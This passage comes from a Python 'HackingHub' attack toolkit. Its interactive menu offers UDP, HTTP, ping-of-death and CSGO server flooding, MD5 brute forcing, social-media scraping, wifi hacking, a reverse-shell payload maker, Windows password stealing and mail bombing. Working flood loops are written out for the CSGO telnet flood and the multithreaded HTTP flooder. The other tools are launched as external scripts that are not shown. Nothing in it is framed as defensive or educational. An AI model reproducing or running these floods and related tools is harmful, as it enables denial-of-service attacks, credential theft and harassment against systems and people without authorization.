        print(Fore.GREEN + 'Ready! Completed in {} seconds. Total hashes were generated - {}'.format(
            str(timespent), str(lines)))
        if found == 0:
            print(Fore.RED + 'MD5 is not broken :(')

def csgoflood(port):
    timer = 0.035 #The timer is configured for official servers
    try:
        with Telnet('localhost', port) as tn:
            print('Connection established!')
            start = input('Run script? (Y or N): ')
            if start == 'Y' or start == 'y':
                while True:
                    try:
                        tn.write(b'status\n')
                        time.sleep(timer)
                    except ConnectionResetError:
                        print('Connection lost!')
            else:
                exit(1)
    except ConnectionRefusedError:
        print('Host not found!')

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

if __name__ == '__main__': #Runs only if the file is run, not imported

    init(autoreset=True) #auto reset for colorama

    art()

    while True: #run loop with "command" line
        time.sleep(1.25)
        start = input(Colorate.Horizontal(Colors.blue_to_cyan, '''
    
        ╔═══[root@HackingHub]
        ╚══> ''', 1))
        if start == 'help':
            print(Fore.GREEN + '''
		    $ checkhost - checking the host for health
		    $ ping - server load with multi-threaded Ping requests (PingOfDeath)
		    $ tiktokparser - parsing data from tiktok
		    $ vkpasrser - parsing data from VKontakte
		    $ okparser - parsing data from Odnoklassniki
		    $ udpflood - IP until denial (UDP) attack
		    $ wordpress - information about CMS Wordpress
		    $ brutemd5 - brute force md5 hash
		    $ csgoflood - CSGO Status Flood (CSGO launch options: -netconport [port])
                    $ wifi-hacking (linux) - Hack any wifi with linux and monitoring wifi card
                    $ revers-shell (linux) - Revers shell payload maker
                    $ stealing-passwords - Steal all password of an windows os
                    $ mail-bomber (linux) - Simply attack mail ;)
                    $ http-flooder
                    $ clear - clearing the console
		    $ exit - output
		    ''')
        elif start == 'checkhost':
            clear()
            url = input('URL: ')
            checkhost(url)
        elif start == 'ping':
            clear()
            host = input('Host (IP): ')
            ping(host)
        elif start == 'okparser':
            clear()
            url = input('OK (url): ')
            okparser(url)
        elif start == 'udpflood':
            clear()
            ip = str(input('IP: '))
            port = int(input('Port: '))
            thread = int(input('Thread: '))
            t = int(input('Times: '))
            until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
            target = launchudp(ip, port, thread, t, until)
            for _ in range(int(target.thread)):
                thd = threading.Thread(target=target.attackudp(target.ip, target.port, target.t, target.until))
                thd.start()
        elif start == 'tiktokparser':
            clear()
            username = input('TikTok username (without @): ')
            tiktokparser(username)
        elif start == 'vkparser':
            clear()
            url = input('VK (url): ')
            vkparser(url)
        elif start == 'wordpress':
            clear()
            Target = str(input('URL: '))
            target = wordpress(Target)
            target.wordpressgetinfo()
        elif start == 'brutemd5':
            clear()
            md5hash = input('MD5 Hash: ')
            minlen = int(input('Minimum brute length: '))
            maxlen = int(input('Maximum brute length: '))
            targethash = md5(md5hash, minlen, maxlen)
            targethash.bruteforce()
        elif start == 'csgoflood':
            clear()
            port = input('Connection port: ')
            csgoflood(port)
            
            
        elif start == 'wifi-hacking':
            python_wifi_chose = input('Environement : [1]python3 | [2]python')
            if python_wifi_chose == '1':
                os.system('python3 tools/Wifihackingmenu.py')
                
            elif python_wifi_chose == input('2'):
                os.system('python tools/Wifihackingmenu.py')
            
            
            
        elif start == 'revers-shell':
            python_shell_chose = input('Environement : [1]python3 | [2]python')
            if python_shell_chose == '1':
                os.system('python3 tools/Reversshellmenu.py')
            
            elif python_shell_chose == input('2'):
                os.system('python tools/Reversshellmenu.py')
            
            
        elif start == 'mail-bomber':
            python_mail_chose = input('Environement : [1]python3 | [2]python')
            if python_mail_chose == '1':
                os.system('python3 tools/m-bomber.py')
            
            elif python_mail_chose == input('2'):
                os.system('python tools/m-bomber.py')

            
        elif start == 'http-flooder':
            #Function to send requests
            def send_requests(url, threads):
                while True:
                    req_n =+1
                    requests.get(url)
                    print(f"Sent {req_n}")

            # Demander à l'utilisateur le nombre de threads et afficher un message
            threads = int(input("Enter number of thread: "))
            print("HTTP-Flooder is lunching with ",threads," threads \n")

            #Ask the user for the URL and display a message
            url = input("Enter URL : ")
            print("Lunched attack on ",url,"...")

            #Create the threads according to the number entered
            for i in range(threads):
                t = threading.Thread(target=send_requests, args=(url,threads))
                t.start()


                
                
                
                
                
                
                
                
                
                
                
        elif start == 'clear':
            clear()
        elif start == 'exit':
            exit(1)
        else:
            print(Fore.RED + '\n    Invalid command!')